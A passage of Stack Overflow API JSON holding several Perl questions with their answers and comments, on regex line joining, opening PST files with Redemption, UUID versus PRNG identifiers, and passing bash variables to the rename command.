"https://lh3.googleusercontent.com/-_8r8eYzR-P4/AAAAAAAAAAI/AAAAAAAAAEo/8OYoHnGS-RM/photo.jpg?sz=128", "display_name": "Jason Hamrick", "link": "https://stackoverflow.com/users/7447975/jason-hamrick"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485793096, "post_id": 41940342, "comment_id": 71061402, "body": "Thank you so much! I&#39;m a novice with this! that worked perfect!"}, {"owner": {"reputation": 1, "user_id": 7447975, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-_8r8eYzR-P4/AAAAAAAAAAI/AAAAAAAAAEo/8OYoHnGS-RM/photo.jpg?sz=128", "display_name": "Jason Hamrick", "link": "https://stackoverflow.com/users/7447975/jason-hamrick"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485793115, "post_id": 41940342, "comment_id": 71061413, "body": "Can I ask you one more question on this...   now if I want to clean all of the [[  ]] out of this file.. how could I do that?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485793445, "post_id": 41940342, "comment_id": 71061616, "body": "You would remove them with a substitution. Before the <code>print</code>, just do <code>s&#47;\\[\\[|\\]\\]&#47;;</code> to remove one pair of either opening or closing brackets from the current line. You can get rid of the <code>&amp;&amp; !&#47;]&#47;</code> by using <code>...</code> instead of <code>..</code> and all <code>$_</code> and <code>=~</code> btw."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1485794990, "post_id": 41940342, "comment_id": 71062534, "body": "Hi Jason, welcome to Stack Overflow. If you&#39;re having trouble with regular expressions and regex operators, I would recommend reading the <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">official Perl regex tutorial</a>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485812606, "post_id": 41940342, "comment_id": 71072092, "body": "@JasonHamrick: Please don&#39;t ask additional questions in comments on Stack Overflow. Every question should be self-contained. It&#39;s also best not to offer someone else&#39;s code as if it were your own unless you understand it inside-out."}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 1, "last_activity_date": 1485793145, "creation_date": 1485793145, "answer_id": 41940632, "question_id": 41940342, "link": "https://stackoverflow.com/questions/41940342/replace-carriage-returns-between/41940632#41940632", "title": "Replace carriage returns between [[ .... ]]", "body": "<p>You need to include both brackets in your patterns for the flip-flop operator <code>..</code>.</p>\n\n<pre><code>/\\[\\[/ .. /\\]\\]/\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7447975, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-_8r8eYzR-P4/AAAAAAAAAAI/AAAAAAAAAEo/8OYoHnGS-RM/photo.jpg?sz=128", "display_name": "Jason Hamrick", "link": "https://stackoverflow.com/users/7447975/jason-hamrick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 41940632, "answer_count": 1, "score": -1, "last_activity_date": 1485793145, "creation_date": 1485792254, "last_edit_date": 1485792302, "question_id": 41940342, "link": "https://stackoverflow.com/questions/41940342/replace-carriage-returns-between", "title": "Replace carriage returns between [[ .... ]]", "body": "<p>I have a file that looks like: </p>\n\n<pre><code>[[ this is a test\nthis is a line\nthis is another line]]\n</code></pre>\n\n<p>I want it to look like:</p>\n\n<pre><code>[[this is a test~this is a line~this is another line]]\n</code></pre>\n\n<p>if I use single [ it works.. with:</p>\n\n<pre><code>perl -ane \"s/\\R/~/ if (/\\[/ .. /\\]/) &amp;&amp; !/]/;print $_ unless $_ =~ /~\\s*\\^s*$/;\" &lt; filename.txt\n</code></pre>\n\n<p>How can I modify this to use double [[ ]] \nI'm having to use double as a divider as I learned some of the text contained single ] which was closing it when it didn't need to be. I have confirmed that no double [[ exists in the files. </p>\n"}, {"tags": ["perl", "outlook-redemption", "pst"], "comments": [{"owner": {"reputation": 56418, "user_id": 332059, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/cSNOK.png?s=128&g=1", "display_name": "Dmitry Streblechenko", "link": "https://stackoverflow.com/users/332059/dmitry-streblechenko"}, "edited": false, "score": 0, "creation_date": 1485792097, "post_id": 41940145, "comment_id": 71060742, "body": "What is the exact error? Keep in mind that the standalone version of MAPI cannot open Unicode PST files."}, {"owner": {"reputation": 11, "user_id": 7459782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa9bca229d2e4e1c3c690f9b34aa9f24?s=128&d=identicon&r=PG&f=1", "display_name": "Amit Nagare", "link": "https://stackoverflow.com/users/7459782/amit-nagare"}, "reply_to_user": {"reputation": 56418, "user_id": 332059, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/cSNOK.png?s=128&g=1", "display_name": "Dmitry Streblechenko", "link": "https://stackoverflow.com/users/332059/dmitry-streblechenko"}, "edited": false, "score": 0, "creation_date": 1485798596, "post_id": 41940145, "comment_id": 71064641, "body": "Using the standalone version of MAPI, unicode PST files cannot be opened. Thanks Dmitry for pointing me in a right direction."}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 7459782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa9bca229d2e4e1c3c690f9b34aa9f24?s=128&d=identicon&r=PG&f=1", "display_name": "Amit Nagare", "link": "https://stackoverflow.com/users/7459782/amit-nagare"}, "is_accepted": false, "score": 0, "last_activity_date": 1485798578, "creation_date": 1485798578, "answer_id": 41942267, "question_id": 41940145, "link": "https://stackoverflow.com/questions/41940145/not-able-to-open-pst-using-redemption-with-exchange-mapi-with-cdo-1-2-1/41942267#41942267", "title": "Not able to open PST using redemption with Exchange Mapi with CDO 1.2.1", "body": "<p>Using the standalone version of MAPI, unicode PST files cannot be opened. Thanks Dmitry for pointing me in a right direction.  </p>\n"}], "owner": {"reputation": 11, "user_id": 7459782, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa9bca229d2e4e1c3c690f9b34aa9f24?s=128&d=identicon&r=PG&f=1", "display_name": "Amit Nagare", "link": "https://stackoverflow.com/users/7459782/amit-nagare"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 213, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485798578, "creation_date": 1485791716, "last_edit_date": 1485796825, "question_id": 41940145, "link": "https://stackoverflow.com/questions/41940145/not-able-to-open-pst-using-redemption-with-exchange-mapi-with-cdo-1-2-1", "title": "Not able to open PST using redemption with Exchange Mapi with CDO 1.2.1", "body": "<p>On a Exchange server 2013 machine Exchange Mapi CDO 1.2.1 is installed.\nI have exported the mailbox into the PST file using powershell commands.\nI want to open the PST file in program using the Redemption library.\nThe session object is created successfully and LogOnPSTStore method is also not giving any error, but when I access the Stores.count it gives me an error. The perl code looks like below:</p>\n\n<pre><code>$session = Win32::OLE-&gt;CreateObject(\"Redemption.RDOSession\");\n$session-&gt;LogonPstStore(\"sample.pst\");\nprint $session-&gt;Stores-&gt;Count;\n</code></pre>\n\n<p>Any help on how can I read the emails from PST on above scenario is really helpful.</p>\n\n<p>Thanks in advance for your help.</p>\n"}, {"tags": ["perl", "random"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485786236, "post_id": 41938213, "comment_id": 71056708, "body": "What&#39;s the id used for?"}, {"owner": {"reputation": 107760, "user_id": 451475, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a632afa4c11779c0cabd7df04eb26ba6?s=128&d=identicon&r=PG", "display_name": "zaph", "link": "https://stackoverflow.com/users/451475/zaph"}, "edited": false, "score": 0, "creation_date": 1485790282, "post_id": 41938213, "comment_id": 71059458, "body": "Do not use rand, it is neither secure nor unique. From the docs: &quot;rand is not cryptographically secure. You should not rely on it in security-sensitive situations.&quot;"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 107760, "user_id": 451475, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a632afa4c11779c0cabd7df04eb26ba6?s=128&d=identicon&r=PG", "display_name": "zaph", "link": "https://stackoverflow.com/users/451475/zaph"}, "edited": false, "score": 0, "creation_date": 1485791403, "post_id": 41938213, "comment_id": 71060277, "body": "@zaph, It seems to me the OP is already aware of that since they are looking for an alternative!"}, {"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485791539, "post_id": 41938213, "comment_id": 71060374, "body": "@ikegami Yeah, yor are right: <code>sometimes we want something more reliable</code>"}], "answers": [{"comments": [{"owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "edited": false, "score": 0, "creation_date": 1485791919, "post_id": 41940057, "comment_id": 71060619, "body": "I have updated my question. So for my purpose I may use any of these two modules, may not?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "edited": false, "score": 0, "creation_date": 1485792421, "post_id": 41940057, "comment_id": 71060977, "body": "Obviously not, since one creates a unique id, and the other one doesn&#39;t."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1485791494, "creation_date": 1485791494, "answer_id": 41940057, "question_id": 41938213, "link": "https://stackoverflow.com/questions/41938213/random-identifiers-secure-vs-unique-what-to-chose/41940057#41940057", "title": "Random identifiers: secure VS unique. What to chose?", "body": "<p>It depends what it's used for.</p>\n\n<p>If it's used to identify as your variable name suggests, it needs to be unique.</p>\n\n<p>For example, if two people shared the same session id, they would share the same session.</p>\n\n<p>For example, if two people shared the same temporary file name, they would share the same file.</p>\n\n<p>It's an encryption key, you want it to be random so it has the most entropy possible.</p>\n"}], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 41940057, "answer_count": 1, "score": 0, "last_activity_date": 1485791638, "creation_date": 1485786183, "last_edit_date": 1485791638, "question_id": 41938213, "link": "https://stackoverflow.com/questions/41938213/random-identifiers-secure-vs-unique-what-to-chose", "title": "Random identifiers: secure VS unique. What to chose?", "body": "<p>Some times when we want to identify something we generate IDentifier for this object.</p>\n\n<p>Sometimes we use just <a href=\"http://perldoc.perl.org/functions/rand.html\" rel=\"nofollow noreferrer\"><code>rand</code></a> sometimes we want something more reliable. Currently I am between:</p>\n\n<ol>\n<li><a href=\"https://metacpan.org/pod/Data::UUID\" rel=\"nofollow noreferrer\">Data::UUID</a></li>\n<li><a href=\"https://metacpan.org/pod/Crypt::PRNG\" rel=\"nofollow noreferrer\">Crypt::PRNG</a></li>\n</ol>\n\n<p><strong>Would be there any difference between results of these two methods?</strong></p>\n\n<pre><code>$id = Data::UUID-&gt;new-&gt;create_bin;    #\n$id = Crypt::PRNG::random_bytes(16);  # https://metacpan.org/pod/Crypt::PRNG#random_bytes\n</code></pre>\n\n<p>Both are 16bytes random. Regardless of interface are there further differences?</p>\n\n<p><strong>UPD</strong><br>\nIn my case I use ID as random string to identificate query to <a href=\"http://stripe.com\" rel=\"nofollow noreferrer\">Stripe</a></p>\n"}, {"tags": ["bash", "image", "perl", "rename", "subdirectory"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485785645, "post_id": 41937876, "comment_id": 71056338, "body": "This is bash, not Perl. What kind of Perl script are you referring to? Also, your example tree output shows a file name twice."}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485786660, "post_id": 41937876, "comment_id": 71057014, "body": "I&#39;m referring to rename command, that is written in Perl <a href=\"http://plasmasturm.org/code/rename/\" rel=\"nofollow noreferrer\">plasmasturm.org/code/rename</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485787346, "post_id": 41937876, "comment_id": 71057455, "body": "I think the <code>-N ...001</code> is nothing special. It&#39;s not any magic, it&#39;s just a string. In the <code>rename</code> program it parses that string. I think you don&#39;t need the second zero, just doing <code>-N ...01</code> would be enough to get the numbers to be as wide as nedeed and zero-padded. Have you run your program with <code>-n</code> to do a a dry run and see what happens?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485787463, "post_id": 41937876, "comment_id": 71057531, "body": "What exactly do you want to know? What&#39;s the problem? Your title sounds like you think you know what your problem is, but I think you&#39;re not telling us everything (possibly because you don&#39;t know which parts are relevant). Please include any error message you are getting, or show us how the output is different from what you&#39;re expecting."}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485788079, "post_id": 41937876, "comment_id": 71057958, "body": "The problem is that with the command   <code>rename -f -N ...001 -X -e &#39;$_ = $N . &#39;_&#39; . $_&#39; *.jpg</code>   I&#39;m not able to concatenate the counter generate by the -N in the perl command (rename) with the name taken in my bash script with the variable $image_name (bash environment).   According to the man page rename should use -e to print the filename. From the manual page, the tutorial show this as example:   <code>rename -N ...01 -X -e &#39;$_ = &quot;File-$N&quot;&#39; *</code>   I&#39;d like to change this pattern in order to print something like:  <code>001_name_surname.jpg</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485788270, "post_id": 41937876, "comment_id": 71058110, "body": "Oh. Ok. It looks like the <code>-e</code> is equivalent to <code>perl -e</code>, which runs stuff as perl code, like an <i>eval</i>. You mixed up the quotes. <code>-e &#39;$_ = &quot;$N&quot; . &quot;_&quot; . $_&#39;</code> should do it. Or <code>-e &#39;$_ = &quot;${N}_$_&quot;&#39;</code> if you want it to be less readable."}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485789578, "post_id": 41937876, "comment_id": 71058983, "body": "Thanks simbabque, but this doesn&#39;t solve :( Is there a way to use the <code>$image_name</code> in the rename parameters? Something like: <code>-e &#39;$_ = &quot;$N&quot; . &quot;_&quot; . $image_name&#39;</code>? I&#39;ve also tried <code>-e &#39;$_ = &quot;$N&quot; . &quot;_&quot; . $ENV{$image_name}&#39;</code> without success."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485789912, "post_id": 41937876, "comment_id": 71059200, "body": "That should be in <code>$ENV{image_name}</code>. Something like <code>-e &#39;$_ = $N . &quot;_&quot; . $ENV{image_name}&#39;</code>. (You don&#39;t need double quotes <code>&quot;&quot;</code> around the <code>$N</code>, I didn&#39;t pay attention above.)"}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485790110, "post_id": 41937876, "comment_id": 71059346, "body": "With <code>rename -f -N ...001 -X -e &#39;$_ = $N . &quot;_&quot; . $ENV{image_name}&#39; *.jpg </code> I get this errror: <code>Use of uninitialized value in concatenation (.) or string at (eval 2) line 1.</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485790479, "post_id": 41937876, "comment_id": 71059599, "body": "So the <code>export</code>ed bash var doesn&#39;t end up in Perl&#39;s env. Hmm. But what do you expect that to do anyway? <code>$_</code> has the filename, and you&#39;re supposed to change it. It looks like the shell var <code>$image_name</code> is the same file name. Why do you want to append the old file name to the new file name? Leave that out and try to run it with <code>-n</code> for a dry run."}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485790801, "post_id": 41937876, "comment_id": 71059818, "body": "I&#39;m trying to use the folder name the is in the format xxx_name_surname to rename the images in the folder. So my script get the folder name, stores in the <code>$image_name</code> variable and I&#39;d like to use it as parameter in the rename command. If you use the syntex you have previously suggested with a ENV variable like $ENV{LOGNAME} it works. So the problems is related in my bash script: I have to store $image_name in something like $ENV{image_name} but I tried and doesn&#39;t work."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485791231, "post_id": 41937876, "comment_id": 71060147, "body": "What should work is setting it explicitly in the environment of the call to <code>rename</code> like this. <code>FOO=$image_name rename ... -e &#39;$ENV{FOO}&#39;</code>"}, {"owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485791844, "post_id": 41937876, "comment_id": 71060567, "body": "I&#39;ve got a solution:  `  \t\t\tIMAGENAME=$(echo $image_name)   \t\t\texport IMAGENAME   \t\t\trename -f -N ...001 -X -e &#39;$_ = $N . &quot;_&quot; . $ENV{IMAGENAME}&#39; *.jpg`"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485792125, "post_id": 41937876, "comment_id": 71060766, "body": "It seems overly complicated. You could probably build that whole string for the <code>-e</code> in bash and then put it there too. But my bash is not sufficient to do that. Post your own solution as an answer here please."}], "answers": [{"tags": [], "owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "is_accepted": false, "score": 0, "last_activity_date": 1485792648, "creation_date": 1485792648, "answer_id": 41940478, "question_id": 41937876, "link": "https://stackoverflow.com/questions/41937876/pass-a-bash-variable-to-a-perl-command/41940478#41940478", "title": "Pass a bash variable to a perl command", "body": "<p><strong>SOLUTION</strong></p>\n\n<p>This solved my question:</p>\n\n<pre><code>    IMAGENAME=$(echo $image_name)\n    export IMAGENAME\n    rename -f -N ...001 -X -e '$_ = $N . \"_\" . $ENV{IMAGENAME}' *.jpg\n</code></pre>\n\n<p>so the final bash script is:</p>\n\n<pre><code>#!/bin/sh\n\nfor d in *; \n    do\n        if [ -d \"$d\" ]; then\n            cd $d;\n            folder_name=${PWD##*/}\n            image_name=${folder_name:4}\n\n            echo \"Rename and sanitize image in folder ...\"\n            IMAGENAME=$(echo $image_name)\n            export IMAGENAME\n            rename -f -N ...001 -X -e '$_ = $N . \"_\" . $ENV{IMAGENAME}' *.jpg\n            echo \"Creating folder\" $d\"/full ...\"\n            mkdir full\n            echo \"Adding padding to image ...\"\n            mogrify -path full -background white -gravity center -resize 1920x1080\\&gt; -extent 1920x1080 *.jpg\n            cd ..\n            echo\n        fi\ndone\necho \"Done.\"\n</code></pre>\n\n<p><strong>NOTE</strong></p>\n\n<p>As you can see the script is not the best solution, but is doing the job.</p>\n"}], "owner": {"reputation": 29, "user_id": 3556783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e221726d2eb8e6a7c2be320c07f877a?s=128&d=identicon&r=PG&f=1", "display_name": "fabiosirna", "link": "https://stackoverflow.com/users/3556783/fabiosirna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 221, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1485792648, "creation_date": 1485785206, "last_edit_date": 1485792491, "question_id": 41937876, "link": "https://stackoverflow.com/questions/41937876/pass-a-bash-variable-to-a-perl-command", "title": "Pass a bash variable to a perl command", "body": "<p>I'm trying to rename a folder with the following structure:</p>\n\n<pre><code>xxx_name_surname/\n\u251c\u2500\u2500 whatever.jpg\n\u251c\u2500\u2500 foobar.jpg\n\u251c [...]\n\u251c\u2500\u2500 barfoo.jpg\n\u2514\u2500\u2500 full\n    \u251c\u2500\u2500 whatever.jpg\n    \u251c\u2500\u2500 foobar.jpg\n    \u251c [...]\n    \u251c\u2500\u2500 barfoo.jpg\n</code></pre>\n\n<p>in something like:</p>\n\n<pre><code>xxx_name_surname/\n\u251c\u2500\u2500 001_name_surname.jpg\n\u251c\u2500\u2500 001_name_surname.jpg\n\u251c [...]\n\u251c\u2500\u2500 011_name_surname.jpg\n\u2514\u2500\u2500 full\n    \u251c\u2500\u2500 001_name_surname.jpg\n    \u251c\u2500\u2500 002_name_surname.jpg\n    \u251c [...]\n    \u251c\u2500\u2500 011_name_surname.jpg\n</code></pre>\n\n<p>I'm using the following script:</p>\n\n<pre><code>#!/bin/sh\nfor d in *; \n    do\n        if [ -d \"$d\" ]; then\n            cd $d;\n\n            folder_name=${PWD##*/}\n            image_name=${folder_name:4}\n            echo Current dir is:\n            echo $current_dir\n            echo \"Rename and sanitize image in folder ...\"\n            export $image_name\n\n            rename -f -N ...001 -X -e '$_ = $N . '_' . $_' *.jpg\n\n            echo\n            echo \"Creating folder\" $d\"/full ...\"\n            mkdir full\n            echo \"Adding padding to image ...\"\n            mogrify -path full -background white -gravity center -resize 1920x1080\\&gt; -extent 1920x1080 *.jpg\n            cd ..\n            echo\n        fi\ndone\n\necho \"Done.\"\n</code></pre>\n\n<p>The script I made is trying to:</p>\n\n<ul>\n<li>parse the folder structure </li>\n<li>get the parent folder name (without the xxx number)</li>\n<li>rename and sanitize the file name (rename is a Perl script -> refer to <a href=\"http://plasmasturm.org/code/rename/\" rel=\"nofollow noreferrer\">http://plasmasturm.org/code/rename/</a>)</li>\n<li>create a full version of the images with mogrify and put the output in the full folder.</li>\n</ul>\n\n<p>My problem is related to the rename command:</p>\n\n<pre><code>rename -f -N ...001 -X -e '$_ = $N . '_' . $_' *.jpg\n</code></pre>\n\n<p>According to the <a href=\"http://plasmasturm.org/code/rename/\" rel=\"nofollow noreferrer\">manual page</a> is it possibile to rename the file with a counter as prefix.\nI understand that is a syntax problem related to pass a bash argument to a perl script. I've also found same answer here on stackexchange but I cannot resolve myself as I'm not a perl expert.</p>\n\n<p>Then I'm aware that the script is very easy, but I'd like to ask if you have suggestions in order to get the same results \u2013 with bash, command line \u2014 but in a better way.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["json", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, 